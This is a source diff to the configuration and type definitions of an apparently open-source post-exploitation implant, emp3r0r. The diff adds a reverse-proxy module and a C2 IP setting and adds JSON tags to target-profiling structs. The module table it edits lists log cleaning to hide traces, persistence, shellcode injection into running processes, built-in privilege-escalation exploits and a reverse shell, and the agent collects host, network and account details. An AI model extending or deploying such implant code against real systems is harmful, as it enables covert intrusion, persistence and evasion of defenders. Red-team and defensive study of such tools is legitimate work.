@@ -16,10 +16,13 @@ var (
 	// CCAddress how our agent finds its CC
 	CCAddress = "https://[cc_ipaddr]"
 
+	// CCIP IP address of CC
+	CCIP = ""
+
 	// Transport what transport is this agent using? (HTTP2 / CDN / TOR)
 	Transport = fmt.Sprintf("HTTP2 (%s)", CCAddress)
 
-	// AESKey generated from Tag -> md5sum, type: []byte
+	// AESKey preshared []byte AESKey for AES encrypt/decrypt
 	AESKey = tun.GenAESKey("Your Pre Shared AES Key: " + OpSep)
 
 	// HTTPClient handles agent's http communication
@@ -70,6 +73,9 @@ var (
 	// ProxyPort start a socks5 proxy to help other agents, on 0.0.0.0:port
 	ProxyPort = "[proxy_port]"
 
+	// ReverseProxyPort for reverse proxy
+	ReverseProxyPort = calculateReverseProxyPort()
+
 	// BroadcastPort port of broadcast server
 	BroadcastPort = "[broadcast_port]"
 
@@ -93,61 +99,61 @@ const (
 
 // Module names
 const (
-	ModCMD_EXEC    = "cmd_exec"
-	ModCLEAN_LOG   = "clean_log"
-	ModLPE_SUGGEST = "lpe_suggest"
-	ModPERSISTENCE = "get_persistence"
-	ModPROXY       = "run_proxy"
-	ModPORT_FWD    = "port_fwd"
-	ModSHELL       = "interactive_shell"
-	ModVACCINE     = "vaccine"
-	ModINJECTOR    = "injector"
-	ModGET_ROOT    = "get_root"
+	ModCMD_EXEC     = "cmd_exec"
+	ModCLEAN_LOG    = "clean_log"
+	ModLPE_SUGGEST  = "lpe_suggest"
+	ModPERSISTENCE  = "get_persistence"
+	ModPROXY        = "run_proxy"
+	ModPORT_FWD     = "port_fwd"
+	ModSHELL        = "interactive_shell"
+	ModVACCINE      = "vaccine"
+	ModINJECTOR     = "injector"
+	ModGET_ROOT     = "get_root"
+	ModREVERSEPROXY = "reverse_proxy"
 )
 
 // Module help info
 var ModuleDocs = map[string]string{
-	ModCMD_EXEC:    "Run a single command on a target",
-	ModCLEAN_LOG:   "Delete lines containing keyword from *tmp logs",
-	ModLPE_SUGGEST: "Run linux-smart-enumeration or linux exploit suggester",
-	ModPERSISTENCE: "Get persistence via built-in methods",
-	ModPROXY:       "Start a socks proxy on target, and use it locally on C2 side",
-	ModPORT_FWD:    "Port mapping from agent to CC (or vice versa), via emp3r0r's HTTP2 (or other) tunnel",
-	ModSHELL:       "Run custom bash on target, a perfect reverse shell",
-	ModVACCINE:     "Vaccine helps you install additional tools on target system",
-	ModINJECTOR:    "Inject shellcode into a running process with GDB",
-	ModGET_ROOT:    "Try some built-in LPE exploits",
+	ModCMD_EXEC:     "Run a single command on a target",
+	ModCLEAN_LOG:    "Delete lines containing keyword from *tmp logs",
+	ModLPE_SUGGEST:  "Run linux-smart-enumeration or linux exploit suggester",
+	ModPERSISTENCE:  "Get persistence via built-in methods",
+	ModPROXY:        "Start a socks proxy on target, and use it locally on C2 side",
+	ModPORT_FWD:     "Port mapping from agent to CC (or vice versa), via emp3r0r's HTTP2 (or other) tunnel",
+	ModSHELL:        "Run custom bash on target, a perfect reverse shell",
+	ModVACCINE:      "Vaccine helps you install additional tools on target system",
+	ModINJECTOR:     "Inject shellcode into a running process with GDB",
+	ModGET_ROOT:     "Try some built-in LPE exploits",
+	ModREVERSEPROXY: "Manually proxy agents who are unable to use our forward proxy",
 }
 
-// SystemInfo agent properties
 type SystemInfo struct {
-	Tag         string   // identifier of the agent
-	Transport   string   // transport the agent uses (HTTP2 / CDN / TOR)
-	Hostname    string   // Hostname and machine ID
-	Hardware    string   // machine details and hypervisor
-	Container   string   // container tech (if any)
-	CPU         string   // CPU info
-	Mem         string   // memory size
-	OS          string   // OS name and version
-	Kernel      string   // kernel release
-	Arch        string   // kernel architecture
-	IP          string   // public IP of the target
-	IPs         []string // IPs that are found on target's NICs
-	ARP         []string // ARP table
-	User        string   // user account info
-	HasRoot     bool     // is agent run as root?
-	HasTor      bool     // is agent from Tor?
-	HasInternet bool     // has internet access?
-
-	Process *AgentProcess // agent's process
+	Tag         string        `json:"Tag"`         // identifier of the agent
+	Transport   string        `json:"Transport"`   // transport the agent uses (HTTP2 / CDN / TOR)
+	Hostname    string        `json:"Hostname"`    // Hostname and machine ID
+	Hardware    string        `json:"Hardware"`    // machine details and hypervisor
+	Container   string        `json:"Container"`   // container tech (if any)
+	CPU         string        `json:"CPU"`         // CPU info
+	Mem         string        `json:"Mem"`         // memory size
+	OS          string        `json:"OS"`          // OS name and version
+	Kernel      string        `json:"Kernel"`      // kernel release
+	Arch        string        `json:"Arch"`        // kernel architecture
+	IP          string        `json:"IP"`          // public IP of the target
+	IPs         []string      `json:"IPs"`         // IPs that are found on target's NICs
+	ARP         []string      `json:"ARP"`         // ARP table
+	User        string        `json:"User"`        // user account info
+	HasRoot     bool          `json:"HasRoot"`     // is agent run as root?
+	HasTor      bool          `json:"HasTor"`      // is agent from Tor?
+	HasInternet bool          `json:"HasInternet"` // has internet access?
+	Process     *AgentProcess `json:"Process"`     // agent's process
 }
 
 // AgentProcess process info of our agent
 type AgentProcess struct {
-	PID     int    // pid
-	PPID    int    // parent PID
-	Cmdline string // process name and command line args
-	Parent  string // parent process name and cmd line args
+	PID     int    `json:"PID"`     // pid
+	PPID    int    `json:"PPID"`    // parent PID
+	Cmdline string `json:"Cmdline"` // process name and command line args
+	Parent  string `json:"Parent"`  // parent process name and cmd line args
 }
 
 // MsgTunData data to send in the tunnel
